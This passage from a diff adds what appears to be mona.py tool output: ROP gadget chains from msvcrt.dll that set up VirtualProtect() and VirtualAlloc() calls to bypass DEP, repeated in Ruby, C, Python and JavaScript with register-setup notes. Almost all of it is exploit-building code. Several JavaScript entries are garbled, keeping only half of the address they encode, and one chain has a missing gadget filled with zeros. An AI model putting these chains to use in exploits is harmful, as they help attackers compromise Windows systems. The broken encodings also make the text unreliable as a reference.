+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_ecx:---]
+      0x7701fdeb,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x77066cd8,  # &Writable location [msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_edi:---]
+      0x76ff0a77,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fc9f09,  # RETN (ROP NOP) [msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_esi:---]
+      0x7704158e,  # POP ESI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fcb7bd,  # JMP [EAX] [msvcrt.dll]
+      0x76ff1a3a,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fc11b8,  # ptr to &VirtualProtect() [IAT msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:pushad:---]
+      0x77025cfc,  # PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:extras:---]
+      0x770446fd,  # ptr to 'call esp' [msvcrt.dll] ** REBASED ** ASLR
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ JavaScript ] ***
+
+  //rop chain generated with mona.py - www.corelan.be
+  rop_gadgets = unescape(
+    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
+    "%u0113" + // 0x7701130a : ,# POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u0113" + // 0x7701130a : ,# skip 4 bytes [msvcrt.dll] ** REBASED ** ASLR
+    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
+    "%u1a3a%u76ff" + // 0x76ff1a3a : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u01ff%u3975" + // 0x397501ff : ,# put delta into eax (-> put 0x00000201 into ebx)
+    "%u7a6b%u76fe" + // 0x76fe7a6b : ,# ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
+    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
+    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
+    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
+    "%ud3a5%u7702" + // 0x7702d3a5 : ,# XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "" + // #[---INFO:gadgets_to_set_edx:---] : 
+    "%u14a2%u76fd" + // 0x76fd14a2 : ,# POP EDX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%uffff%uffff" + // 0xffffffff : ,#
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6fe3%u76fd" + // 0x76fd6fe3 : ,# INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
+    "%ufdeb%u7701" + // 0x7701fdeb : ,# POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6cd8%u7706" + // 0x77066cd8 : ,# &Writable location [msvcrt.dll] ** REBASED ** ASLR
+    "" + // #[---INFO:gadgets_to_set_edi:---] : 
+    "%u76ff" + // 0x76ff0a77 : ,# POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u9f09%u76fc" + // 0x76fc9f09 : ,# RETN (ROP NOP) [msvcrt.dll] ** REBASED ** ASLR
+    "" + // #[---INFO:gadgets_to_set_esi:---] : 
+    "%u158e%u7704" + // 0x7704158e : ,# POP ESI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%ub7bd%u76fc" + // 0x76fcb7bd : ,# JMP [EAX] [msvcrt.dll]
+    "%u1a3a%u76ff" + // 0x76ff1a3a : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u11b8%u76fc" + // 0x76fc11b8 : ,# ptr to &VirtualProtect() [IAT msvcrt.dll] ** REBASED ** ASLR
+    "" + // #[---INFO:pushad:---] : 
+    "%u5cfc%u7702" + // 0x77025cfc : ,# PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "" + // #[---INFO:extras:---] : 
+    "%u46fd%u7704" + // 0x770446fd : ,# ptr to 'call esp' [msvcrt.dll] ** REBASED ** ASLR
+    ""); //  : 
+
+
+--------------------------------------------------------------------------------------------------
+
+
+################################################################################
+
+Register setup for VirtualAlloc() :
+--------------------------------------------
+ EAX = NOP (0x90909090)
+ ECX = flProtect (0x40)
+ EDX = flAllocationType (0x1000)
+ EBX = dwSize
+ ESP = lpAddress (automatic)
+ EBP = ReturnTo (ptr to jmp esp)
+ ESI = ptr to VirtualAlloc()
+ EDI = ROP NOP (RETN)
+ --- alternative chain ---
+ EAX = ptr to &VirtualAlloc()
+ ECX = flProtect (0x40)
+ EDX = flAllocationType (0x1000)
+ EBX = dwSize
+ ESP = lpAddress (automatic)
+ EBP = POP (skip 4 bytes)
+ ESI = ptr to JMP [EAX]
+ EDI = ROP NOP (RETN)
+ + place ptr to "jmp esp" on stack, below PUSHAD
+--------------------------------------------
+
+
+ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
+--------------------------------------------------------
+
+*** [ Ruby ] ***
+
+  def create_rop_chain()
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = 
+    [
+      #[---INFO:gadgets_to_set_ebp:---]
+      0x76fd6d87,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6d87,  # skip 4 bytes [msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_ebx:---]
+      0x77053866,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0xffffff39,  # put delta into eax (-> put 0x00000001 into ebx)
+      0x77013b6b,  # ADD EAX,0C8 # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x7702d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_edx:---]
+      0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
+      #[---INFO:gadgets_to_set_ecx:---]
+      0x76ff1a3a,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0xffffff78,  # put delta into eax (-> put 0x00000040 into ecx)
+      0x77013b6b,  # ADD EAX,0C8 # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76feb984,  # XCHG EAX,ECX # ADD AL,5D # RETN 0x04 [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_edi:---]
+      0x76fd8e0d,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x41414141,  # Filler (RETN offset compensation)
+      0x76fc9f09,  # RETN (ROP NOP) [msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_esi:---]
+      0x76fd4cb4,  # POP ESI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fcb7bd,  # JMP [EAX] [msvcrt.dll]
+      0x76fff5d4,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fc11bc,  # ptr to &VirtualAlloc() [IAT msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:pushad:---]
+      0x77025cfc,  # PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:extras:---]
+      0x76ff30ad,  # ptr to 'call esp' [msvcrt.dll] ** REBASED ** ASLR
+    ].flatten.pack("V*")
+
+    return rop_gadgets
+
+  end
+
+
+  # Call the ROP chain generator inside the 'exploit' function :
+
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ C ] ***
+
+  #define CREATE_ROP_CHAIN(name, ...) \
+    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
+    unsigned int name[name##_length / sizeof(unsigned int)]; \
+    create_rop_chain(name, ##__VA_ARGS__);
+
+  int create_rop_chain(unsigned int *buf, unsigned int )
+  {
+    // rop chain generated with mona.py - www.corelan.be
+    unsigned int rop_gadgets[] = {
+      //[---INFO:gadgets_to_set_ebp:---]
+      0x76fd6d87,  // POP EBP // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6d87,  // skip 4 bytes [msvcrt.dll] ** REBASED ** ASLR
+      //[---INFO:gadgets_to_set_ebx:---]
+      0x77053866,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0xffffff39,  // put delta into eax (-> put 0x00000001 into ebx)
+      0x77013b6b,  // ADD EAX,0C8 // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x7702d3a5,  // XCHG EAX,EBX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      //[---INFO:gadgets_to_set_edx:---]
+      0x00000000,  // [-] Unable to find gadget to put 00001000 into edx
+      //[---INFO:gadgets_to_set_ecx:---]
+      0x76ff1a3a,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0xffffff78,  // put delta into eax (-> put 0x00000040 into ecx)
+      0x77013b6b,  // ADD EAX,0C8 // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76feb984,  // XCHG EAX,ECX // ADD AL,5D // RETN 0x04 [msvcrt.dll] ** REBASED ** ASLR 
+      //[---INFO:gadgets_to_set_edi:---]
+      0x76fd8e0d,  // POP EDI // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x41414141,  // Filler (RETN offset compensation)
+      0x76fc9f09,  // RETN (ROP NOP) [msvcrt.dll] ** REBASED ** ASLR
+      //[---INFO:gadgets_to_set_esi:---]
+      0x76fd4cb4,  // POP ESI // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fcb7bd,  // JMP [EAX] [msvcrt.dll]
+      0x76fff5d4,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fc11bc,  // ptr to &VirtualAlloc() [IAT msvcrt.dll] ** REBASED ** ASLR
+      //[---INFO:pushad:---]
+      0x77025cfc,  // PUSHAD // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      //[---INFO:extras:---]
+      0x76ff30ad,  // ptr to 'call esp' [msvcrt.dll] ** REBASED ** ASLR
+    };
+    if(buf != NULL) {
+      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
+    };
+    return sizeof(rop_gadgets);
+  }
+
+  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
+  CREATE_ROP_CHAIN(rop_chain, );
+  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
+  // unsigned int rop_chain[256];
+  // int rop_chain_length = create_rop_chain(rop_chain, );
+
+*** [ Python ] ***
+
+  def create_rop_chain():
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+      #[---INFO:gadgets_to_set_ebp:---]
+      0x76fd6d87,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6d87,  # skip 4 bytes [msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_ebx:---]
+      0x77053866,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0xffffff39,  # put delta into eax (-> put 0x00000001 into ebx)
+      0x77013b6b,  # ADD EAX,0C8 # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x7702d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_edx:---]
+      0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
+      #[---INFO:gadgets_to_set_ecx:---]
+      0x76ff1a3a,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0xffffff78,  # put delta into eax (-> put 0x00000040 into ecx)
+      0x77013b6b,  # ADD EAX,0C8 # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76feb984,  # XCHG EAX,ECX # ADD AL,5D # RETN 0x04 [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_edi:---]
+      0x76fd8e0d,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x41414141,  # Filler (RETN offset compensation)
+      0x76fc9f09,  # RETN (ROP NOP) [msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_esi:---]
+      0x76fd4cb4,  # POP ESI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fcb7bd,  # JMP [EAX] [msvcrt.dll]
+      0x76fff5d4,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fc11bc,  # ptr to &VirtualAlloc() [IAT msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:pushad:---]
+      0x77025cfc,  # PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:extras:---]
+      0x76ff30ad,  # ptr to 'call esp' [msvcrt.dll] ** REBASED ** ASLR
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ JavaScript ] ***
+
+  //rop chain generated with mona.py - www.corelan.be
+  rop_gadgets = unescape(
+    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
+    "%u6d87%u76fd" + // 0x76fd6d87 : ,# POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u6d87%u76fd" + // 0x76fd6d87 : ,# skip 4 bytes [msvcrt.dll] ** REBASED ** ASLR
+    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
+    "%u3866%u7705" + // 0x77053866 : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%uff39%uffff" + // 0xffffff39 : ,# put delta into eax (-> put 0x00000001 into ebx)
+    "%u3b6b%u7701" + // 0x77013b6b : ,# ADD EAX,0C8 # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%ud3a5%u7702" + // 0x7702d3a5 : ,# XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "" + // #[---INFO:gadgets_to_set_edx:---] : 
+    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadget to put 00001000 into edx
+    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
+    "%u1a3a%u76ff" + // 0x76ff1a3a : ,# POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%uff78%uffff" + // 0xffffff78 : ,# put delta into eax (-> put 0x00000040 into ecx)
+    "%u3b6b%u7701" + // 0x77013b6b : ,# ADD EAX,0C8 # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%ub984%u76fe" + // 0x76feb984 : ,# XCHG EAX,ECX # ADD AL,5D # RETN 0x04 [msvcrt.dll] ** REBASED ** ASLR 
+    "" + // #[---INFO:gadgets_to_set_edi:---] : 
+    "%u8e0d%u76fd" + // 0x76fd8e0d : ,# POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
+    "%u9f09%u76fc" + // 0x76fc9f09 : ,# RETN (ROP NOP) [msvcrt.dll] ** REBASED ** ASLR
+    "" + // #[---INFO:gadgets_to_set_esi:---] : 
+    "%u4cb4%u76fd" + // 0x76fd4cb4 : ,# POP ESI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+    "%ub7bd%u76fc" + // 0x76fcb7bd : ,# JMP [EAX] [msvcrt.dll]
